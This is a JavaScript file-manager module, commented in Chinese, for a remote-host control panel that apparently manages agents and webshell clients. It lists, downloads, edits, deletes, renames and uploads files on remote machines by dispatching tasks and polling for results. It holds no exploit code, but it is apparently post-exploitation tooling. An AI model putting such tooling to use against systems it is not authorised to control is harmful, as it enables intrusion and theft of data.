// app-files.js - 文件管理（基于 task_id 精确轮询，避免匹配到旧任务）

app.renderFiles = function() {
    if (!this.selectedClient) {
        return this.renderClientBar();
    }
    return `
        ${this.renderClientBar()}
        <div class="card" style="padding:20px;">
            <div style="display:flex; gap:8px; margin-bottom:16px; align-items:center; flex-wrap:wrap;">
                <button class="btn btn-secondary" onclick="app.fileUp()" title="返回上级目录"><i class="fas fa-arrow-up"></i> 上级</button>
                <input type="text" class="input" id="filePathInput" value="${this.fileCurrentPath}" style="flex:1; min-width:200px;" placeholder="输入路径后回车跳转，如 C:\\Users 或 /tmp" onkeydown="if(event.key==='Enter')app.fileGoto(this.value)">
                <button class="btn btn-primary" onclick="app.fileGoto(document.getElementById('filePathInput').value)"><i class="fas fa-arrow-right"></i> 转到</button>
                <button class="btn btn-secondary" onclick="app.refreshFiles()" title="刷新当前目录"><i class="fas fa-sync"></i> 刷新</button>
                <button class="btn btn-blue" onclick="app.fileNewDir()"><i class="fas fa-folder-plus"></i> 新建目录</button>
                <label class="btn btn-primary" style="cursor:pointer;">
                    <i class="fas fa-upload"></i> 上传文件
                    <input type="file" style="display:none;" onchange="app.fileUpload(this)">
                </label>
            </div>
            <div style="border:1px solid #21262d; border-radius:8px; min-height:400px;">
                ${this.fileList.length > 0 ? this.fileList.map((f, idx) => {
                    // 用数组索引代替路径字符串传参，彻底避免路径中特殊字符破坏 onclick
                    const isTextFile = !f.is_dir;
                    const escName = (f.name||'').replace(/</g,'&lt;').replace(/>/g,'&gt;');
                    return `
                    <div class="file-item ${f.is_dir ? 'dir' : 'file'}">
                        <i class="fas ${f.is_dir ? 'fa-folder' : 'fa-file'}" style="cursor:pointer; flex-shrink:0;" onclick="app.fileEnter(${idx})"></i>
                        <span style="flex:1; min-width:0; cursor:pointer; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${escName}" onclick="${f.is_dir ? `app.fileEnter(${idx})` : `app.fileDownload(${idx})`}">${escName}</span>
                        <span style="color:#8b949e; font-size:11px; min-width:70px; text-align:right; flex-shrink:0;">${f.is_dir ? '-' : (f.size >= 1024*1024 ? (f.size/1024/1024).toFixed(1)+'MB' : f.size >= 1024 ? (f.size/1024).toFixed(1)+'KB' : (f.size||0)+'B')}</span>
                        <span style="color:#6e7681; font-size:11px; min-width:120px; flex-shrink:0;">${f.mtime || ''}</span>
                        ${isTextFile ? `<button class="btn btn-blue" style="padding:2px 8px; font-size:11px; flex-shrink:0; position:relative; z-index:2;" title="编辑文件" onclick="app.fileEdit(${idx})"><i class="fas fa-edit"></i></button>` : ''}
                        <button class="btn btn-secondary" style="padding:2px 8px; font-size:11px; flex-shrink:0; position:relative; z-index:2;" title="重命名" onclick="app.fileRename(${idx})"><i class="fas fa-i-cursor"></i></button>
                        <button class="btn btn-danger" style="padding:2px 8px; font-size:11px; flex-shrink:0; position:relative; z-index:2;" title="删除" onclick="app.fileDelete(${idx})"><i class="fas fa-trash"></i></button>
                    </div>
                    `;
                }).join('') : `
                    <div style="text-align:center; padding:80px; color:#8b949e;">
                        <i class="fas fa-folder-open" style="font-size:36px; margin-bottom:12px;"></i>
                        <div>点击"刷新"加载文件列表，或在路径框输入目录后回车跳转</div>
                    </div>
                `}
            </div>
            <div style="margin-top:12px; font-size:11px; color:#6e7681;">
                <i class="fas fa-info-circle"></i> 路径框可编辑 | 回车或点"转到"跳转目录 | 点击文件夹进入 | 点击文件名下载 | 蓝色编辑按钮可编辑任意文件（二进制文件读取后展示为文本）
            </div>
        </div>
    `;
};

// 路径拼接工具（兼容 Windows 反斜杠和 Unix 正斜杠）
app._joinPath = function(base, name) {
    if (!base || base === '.' || base === './') return name;
    const sep = base.includes('\\') ? '\\' : '/';
    if (base.endsWith(sep)) return base + name;
    return base + sep + name;
};

app.fileUp = async function() {
    // 通过相对路径 .. 让agent返回上级，等待任务返回更新路径
    const taskIds = await this.sendTask('file_list', { path: '..' });
    if (taskIds && taskIds.length > 0) {
        this._waitForFileTask(taskIds[0]);
    }
};

app.fileEnter = async function(idx) {
    const f = this.fileList[idx];
    if (!f || !f.is_dir) return;
    const newPath = this._joinPath(this.fileCurrentPath, f.name);
    this.fileCurrentPath = newPath;
    const taskIds = await this.sendTask('file_list', { path: newPath });
    if (taskIds && taskIds.length > 0) {
        this._waitForFileTask(taskIds[0]);
    }
};

// 跳转到指定路径（用户手动输入）
app.fileGoto = async function(targetPath) {
    if (!targetPath || !targetPath.trim()) {
        this._notify('请输入有效路径', 'error');
        return;
    }
    targetPath = targetPath.trim();
    this.fileCurrentPath = targetPath;
    const taskIds = await this.sendTask('file_list', { path: targetPath });
    if (taskIds && taskIds.length > 0) {
        this._waitForFileTask(taskIds[0]);
    }
};

// 下载文件：下发任务 → 等待完成 → 浏览器自动下载
app.fileDownload = async function(idx) {
    const f = this.fileList[idx];
    if (!f || f.is_dir) return;
    const fullPath = this._joinPath(this.fileCurrentPath, f.name);
    const fileName = f.name || 'download';

    const loading = this._notify(`正在下载 ${fileName}...`, 'loading', 0);
    const taskIds = await this.sendTask('file_download', { path: fullPath });
    if (!taskIds || taskIds.length === 0) {
        loading.remove();
        return;
    }

    // 轮询任务结果
    let attempts = 0;
    const maxAttempts = 30;
    const check = () => {
        attempts++;
        API.get(`/api/task/${taskIds[0]}`).then(task => {
            if (!task) { if (attempts < maxAttempts) setTimeout(check, 2000); return; }
            if (task.status === 'completed' && task.result) {
                loading.remove();
                // WebShell 响应信封拆包
                let r = task.result;
                if (this.selectedClient && this.selectedClient.client_type === 'webshell') {
                    r = this._unwrapWebshellResult(r);
                }
                // 后端大文件存为资源文件：{"type":"file","path":"/api/resource/downloads/xxx","filename":"xxx"}
                // 小文件直接返回：{"filename":"xxx","data":"base64..."}
                try {
                    const data = JSON.parse(r);
                    if (data.path) {
                        // 大文件：通过资源URL下载
                        const dlUrl = location.origin + data.path + '?token=' + API.token + '&download=1';
                        app._triggerBrowserDownload(dlUrl, data.filename || fileName);
                    } else if (data.data) {
                        // 小文件：base64 解码后 Blob 下载
                        const byteStr = atob(data.data);
                        const bytes = new Uint8Array(byteStr.length);
                        for (let i = 0; i < byteStr.length; i++) bytes[i] = byteStr.charCodeAt(i);
                        const blob = new Blob([bytes], { type: 'application/octet-stream' });
                        const blobUrl = URL.createObjectURL(blob);
                        app._triggerBrowserDownload(blobUrl, data.filename || fileName);
                        setTimeout(() => URL.revokeObjectURL(blobUrl), 10000);
                    } else {
                        this._notify('下载结果格式异常', 'error');
                    }
                } catch(e) {
                    // 非 JSON，可能是错误信息
                    if (r.startsWith('[ERROR]') || r.startsWith('[-]')) {
                        this._notify('下载失败: ' + r, 'error');
                    } else {
                        this._notify('下载结果解析失败', 'error');
                    }
                }
            } else if (task.status === 'failed') {
                loading.remove();
                this._notify('下载失败: ' + (task.result || '未知错误'), 'error');
            } else if (attempts < maxAttempts) {
                setTimeout(check, 2000);
            } else {
                loading.remove();
                this._notify('下载超时，请检查主机是否在线', 'error');
            }
        }).catch(() => { if (attempts < maxAttempts) setTimeout(check, 2000); });
    };
    // WebShell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const _isWs = this.selectedClient && this.selectedClient.client_type === 'webshell';
    setTimeout(check, _isWs ? 100 : 1500);
};

// 触发浏览器下载（创建隐藏 <a> 标签点击）
app._triggerBrowserDownload = function(url, filename) {
    const a = document.createElement('a');
    a.href = url;
    a.download = filename || 'download';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => a.remove(), 1000);
    this._notify(`文件 ${filename} 已开始下载`, 'success');
};

// 查看/编辑文本文件（弹出模态框，支持读取+保存）
app.fileEdit = async function(idx) {
    if (!this.selectedClient) { this._notify('请先选择主机', 'error'); return; }
    const f = this.fileList[idx];
    if (!f) return;
    const path = this._joinPath(this.fileCurrentPath, f.name);
    // 保存到实例供 fileSaveContent 使用
    this._editingFilePath = path;
    // 打开编辑模态框（loading 状态）
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.id = 'fileEditOverlay';
    overlay.innerHTML = `
        <div class="modal" style="max-width:900px; width:95vw; padding:16px; display:flex; flex-direction:column; max-height:90vh;">
            <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; gap:8px;">
                <h3 style="font-size:14px;"><i class="fas fa-edit" style="color:#58a6ff;"></i> 编辑文件</h3>
                <div style="display:flex; gap:8px; align-items:center;">
                    <span id="editFileName" style="font-size:12px; color:#8b949e;">${path}</span>
                    <span id="editEncoding" class="badge badge-blue" style="display:none;"></span>
                    <button class="btn btn-secondary" style="padding:4px 10px; font-size:12px;" onclick="this.closest('.modal-overlay').remove()"><i class="fas fa-times"></i> 关闭</button>
                </div>
            </div>
            <div id="editLoading" style="padding:40px; text-align:center; color:#8b949e;">
                <i class="fas fa-spinner fa-spin" style="font-size:32px;"></i>
                <div style="margin-top:12px;">正在读取文件内容...</div>
            </div>
            <div id="editContent" style="display:none; flex:1; display:flex; flex-direction:column; min-height:400px;">
                <textarea id="editTextArea" class="textarea" style="flex:1; min-height:400px; font-family:Consolas,Monaco,monospace; font-size:12px; resize:vertical;" spellcheck="false"></textarea>
                <div style="display:flex; justify-content:space-between; align-items:center; margin-top:12px;">
                    <span id="editInfo" style="font-size:11px; color:#6e7681;"></span>
                    <div style="display:flex; gap:8px;">
                        <button class="btn btn-secondary" onclick="document.getElementById('fileEditOverlay').remove()">取消</button>
                        <button class="btn btn-primary" onclick="app.fileSaveContent()"><i class="fas fa-save"></i> 保存</button>
                    </div>
                </div>
            </div>
        </div>
    `;
    overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
    document.body.appendChild(overlay);

    // 下发 file_view 任务
    const taskIds = await this.sendTask('file_view', { path: path });
    if (!taskIds || taskIds.length === 0) {
        document.getElementById('editLoading').innerHTML = '<div style="color:#f85149;">任务下发失败</div>';
        return;
    }
    let attempts = 0;
    const check = () => {
        attempts++;
        API.get(`/api/task/${taskIds[0]}`).then(task => {
            if (!task) { if (attempts < 15) setTimeout(check, 2000); return; }
            if (task.status === 'completed' && task.result) {
                // WebShell 响应信封拆包
                let r = task.result;
                if (this.selectedClient && this.selectedClient.client_type === 'webshell') {
                    r = this._unwrapWebshellResult(r);
                }
                if (r.startsWith('[ERROR]')) {
                    document.getElementById('editLoading').innerHTML = `<div style="color:#f85149;">${r}</div>`;
                    return;
                }
                try {
                    const data = JSON.parse(r);
                    const ta = document.getElementById('editTextArea');
                    const enc = document.getElementById('editEncoding');
                    const info = document.getElementById('editInfo');
                    ta.value = data.content || '';
                    if (enc) { enc.textContent = '编码: ' + (data.encoding || 'utf-8'); enc.style.display = 'inline-block'; }
                    if (info) {
                        const sizeStr = data.size >= 1024 ? (data.size/1024).toFixed(1) + ' KB' : data.size + ' B';
                        info.textContent = `大小: ${sizeStr} | 编码: ${data.encoding || 'utf-8'}${data.truncated ? ' | [已截断]' : ''}`;
                    }
                    document.getElementById('editLoading').style.display = 'none';
                    document.getElementById('editContent').style.display = 'flex';
                } catch(e) {
                    document.getElementById('editLoading').innerHTML = `<div style="color:#f85149;">解析失败: ${r.substring(0, 200)}</div>`;
                }
            } else if (task.status === 'failed') {
                document.getElementById('editLoading').innerHTML = `<div style="color:#f85149;">${task.result || '读取失败'}</div>`;
            } else if (attempts < 15) {
                setTimeout(check, 2000);
            } else {
                document.getElementById('editLoading').innerHTML = '<div style="color:#f85149;">读取超时</div>';
            }
        }).catch(() => { if (attempts < 15) setTimeout(check, 2000); });
    };
    // WebShell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const _isWs = this.selectedClient && this.selectedClient.client_type === 'webshell';
    setTimeout(check, _isWs ? 100 : 1500);
};

// 保存编辑后的文本内容
app.fileSaveContent = async function() {
    const path = this._editingFilePath;
    if (!path) { this._notify('无法确定文件路径', 'error'); return; }
    const ta = document.getElementById('editTextArea');
    if (!ta) return;
    const content = ta.value;
    const encBadge = document.getElementById('editEncoding');
    const encoding = encBadge ? encBadge.textContent.replace('编码: ', '') : 'utf-8';

    const btn = document.querySelector('#fileEditOverlay button.btn-primary');
    if (btn) { btn.disabled = true; btn.style.opacity = '0.6'; }
    const loading = this._notify('正在保存文件...', 'loading', 0);

    const taskIds = await this.sendTask('file_save', { path: path, content: content, encoding: encoding });
    if (!taskIds || taskIds.length === 0) {
        loading.remove();
        if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
        return;
    }
    let attempts = 0;
    const check = () => {
        attempts++;
        API.get(`/api/task/${taskIds[0]}`).then(task => {
            if (!task) { if (attempts < 15) setTimeout(check, 2000); return; }
            if (task.status === 'completed' && task.result) {
                loading.remove();
                if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
                // WebShell 响应信封拆包
                let r = task.result;
                if (this.selectedClient && this.selectedClient.client_type === 'webshell') {
                    r = this._unwrapWebshellResult(r);
                }
                if (r.startsWith('[ERROR]')) {
                    this._notify('保存失败: ' + r, 'error');
                } else {
                    try {
                        const data = JSON.parse(r);
                        this._notify(`保存成功: ${data.path} (${data.size} bytes)`, 'success');
                        // 关闭编辑框
                        const ov = document.getElementById('fileEditOverlay');
                        if (ov) ov.remove();
                    } catch(e) {
                        this._notify('保存成功', 'success');
                        const ov = document.getElementById('fileEditOverlay');
                        if (ov) ov.remove();
                    }
                }
            } else if (task.status === 'failed') {
                loading.remove();
                if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
                this._notify('保存失败: ' + (task.result || ''), 'error');
            } else if (attempts < 15) {
                setTimeout(check, 2000);
            } else {
                loading.remove();
                if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
                this._notify('保存超时', 'error');
            }
        }).catch(() => { if (attempts < 15) setTimeout(check, 2000); });
    };
    // WebShell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const _isWs = this.selectedClient && this.selectedClient.client_type === 'webshell';
    setTimeout(check, _isWs ? 100 : 1500);
};

app.fileNewDir = async function() {
    const name = prompt('请输入新目录名:');
    if (!name) return;
    const path = this._joinPath(this.fileCurrentPath, name);
    await this.sendTask('file_mkdir', { path: path });
    this._notify('新建目录任务已下发: ' + name);
    setTimeout(() => this.refreshFiles(), 1500);
};

app.fileDelete = async function(idx) {
    const f = this.fileList[idx];
    if (!f) return;
    const fullPath = this._joinPath(this.fileCurrentPath, f.name);
    if (!confirm('确认删除: ' + f.name + ' ？\n（目录将递归删除）')) return;

    const loading = this._notify(`正在删除 ${f.name}...`, 'loading', 0);
    const taskIds = await this.sendTask('file_delete', { path: fullPath });
    if (!taskIds || taskIds.length === 0) {
        loading.remove();
        return;
    }
    // 等待任务完成后再刷新文件列表
    let attempts = 0;
    const check = () => {
        attempts++;
        API.get(`/api/task/${taskIds[0]}`).then(task => {
            if (!task) { if (attempts < 15) setTimeout(check, 2000); return; }
            if (task.status === 'completed') {
                loading.remove();
                this._notify(`已删除: ${f.name}`, 'success');
                this.refreshFiles();
            } else if (task.status === 'failed') {
                loading.remove();
                this._notify('删除失败: ' + (task.result || '未知错误'), 'error');
            } else if (attempts < 15) {
                setTimeout(check, 2000);
            } else {
                loading.remove();
                this._notify('删除超时', 'error');
            }
        }).catch(() => { if (attempts < 15) setTimeout(check, 2000); });
    };
    // WebShell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const _isWs = this.selectedClient && this.selectedClient.client_type === 'webshell';
    setTimeout(check, _isWs ? 100 : 1500);
};

app.fileRename = async function(idx) {
    const f = this.fileList[idx];
    if (!f) return;
    const fullPath = this._joinPath(this.fileCurrentPath, f.name);
    const newPath = prompt('重命名为（完整新路径）:', fullPath);
    if (!newPath || newPath === fullPath) return;

    const loading = this._notify(`正在重命名 ${f.name}...`, 'loading', 0);
    const taskIds = await this.sendTask('file_rename', { old_path: fullPath, new_path: newPath });
    if (!taskIds || taskIds.length === 0) {
        loading.remove();
        return;
    }
    let attempts = 0;
    const check = () => {
        attempts++;
        API.get(`/api/task/${taskIds[0]}`).then(task => {
            if (!task) { if (attempts < 15) setTimeout(check, 2000); return; }
            if (task.status === 'completed') {
                loading.remove();
                this._notify(`已重命名: ${f.name} → ${newPath}`, 'success');
                this.refreshFiles();
            } else if (task.status === 'failed') {
                loading.remove();
                this._notify('重命名失败: ' + (task.result || '未知错误'), 'error');
            } else if (attempts < 15) {
                setTimeout(check, 2000);
            } else {
                loading.remove();
                this._notify('重命名超时', 'error');
            }
        }).catch(() => { if (attempts < 15) setTimeout(check, 2000); });
    };
    // WebShell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const _isWs = this.selectedClient && this.selectedClient.client_type === 'webshell';
    setTimeout(check, _isWs ? 100 : 1500);
};

app.fileUpload = async function(input) {
    if (!input.files || input.files.length === 0) return;
    const file = input.files[0];
    if (!this.selectedClient) {
        this._notify('请先选择目标主机', 'error');
        return;
    }
    // 从配置管理读取上传大小限制（limits.file_upload_max_mb）
    const limits = (this._settingsData && this._settingsData.limits) || {};
    const maxMb = parseInt(limits.file_upload_max_mb, 10) || 50;
    if (file.size > maxMb * 1024 * 1024) {
        this._notify(`文件太大，不能超过 ${maxMb}MB`, 'error');
        return;
    }

    const loading = this._notify('正在上传文件...', 'loading', 0);
    const fd = new FormData();
    fd.append('file', file);
    fd.append('client_id', this.selectedClient.client_id);
    try {
        const res = await fetch('/api/file/upload', {
            method: 'POST',
            headers: { 'Authorization': 'Bearer ' + API.token },
            body: fd
        });
        const data = await res.json();
        if (!data.success) {
            loading.remove();
            this._notify('上传到服务端失败: ' + (data.error || '未知错误'), 'error');
            return;
        }
        const url = location.origin + encodeURI(data.path) + '?token=' + API.token;
        const targetPath = this._joinPath(this.fileCurrentPath, file.name);
        await this.sendTask('file_upload', { url: url, target_path: targetPath });
        loading.remove();
        this._notify('文件已上传，下发到目标: ' + file.name, 'success');
        input.value = '';
        setTimeout(() => this.refreshFiles(), 2000);
    } catch(e) {
        loading.remove();
        this._notify('上传失败: ' + e.message, 'error');
    }
};

app.refreshFiles = async function() {
    const taskIds = await this.sendTask('file_list', { path: this.fileCurrentPath || '.' });
    if (taskIds && taskIds.length > 0) {
        this._waitForFileTask(taskIds[0]);
    }
};

// 基于 task_id 精确轮询单个任务状态，避免匹配到旧任务
app._waitForFileTask = function(taskId) {
    if (!taskId) {
        this._notify('任务下发失败，无 task_id', 'error');
        return;
    }
    let attempts = 0;
    const maxAttempts = 15;  // 最多等待 30 秒
    const check = () => {
        attempts++;
        API.get(`/api/task/${taskId}`).then(task => {
            if (!task) {
                if (attempts < maxAttempts) setTimeout(check, 2000);
                return;
            }
            if (task.status === 'completed' && task.result) {
                // WebShell 响应信封拆包: 服务端可能残留 {"result":"...","status":"completed"} 格式
                let r = task.result;
                if (this.selectedClient && this.selectedClient.client_type === 'webshell') {
                    r = this._unwrapWebshellResult(r);
                }
                // 尝试 JSON 解析（file_list 正常返回是 JSON）
                try {
                    const data = JSON.parse(r);
                    if (data && data.items) {
                        this.fileList = data.items;
                        if (data.path) this.fileCurrentPath = data.path;
                        this.render();
                        return;
                    }
                } catch(e) {
                    // result 不是 JSON，可能是错误信息
                    if (r && (r.indexOf('[ERROR]') === 0 || r.indexOf('[-]') === 0)) {
                        this._notify('文件操作失败: ' + r, 'error', 6000);
                        return;
                    }
                }
                this._notify('文件列表解析失败: ' + (r || '').slice(0, 100), 'error', 6000);
                return;
            }
            if (task.status === 'failed') {
                this._notify('文件操作失败: ' + (task.result || '未知错误'), 'error', 6000);
                return;
            }
            // pending / running 继续等待
            if (attempts < maxAttempts) setTimeout(check, 2000);
            else this._notify('文件操作超时，请检查主机是否在线', 'error', 6000);
        }).catch(() => {
            if (attempts < maxAttempts) setTimeout(check, 2000);
        });
    };
    // WebShell 同步模式：sendTask 返回时 task 已是 completed，立即检查
    const _isWs = this.selectedClient && this.selectedClient.client_type === 'webshell';
    setTimeout(check, _isWs ? 100 : 1500);
};
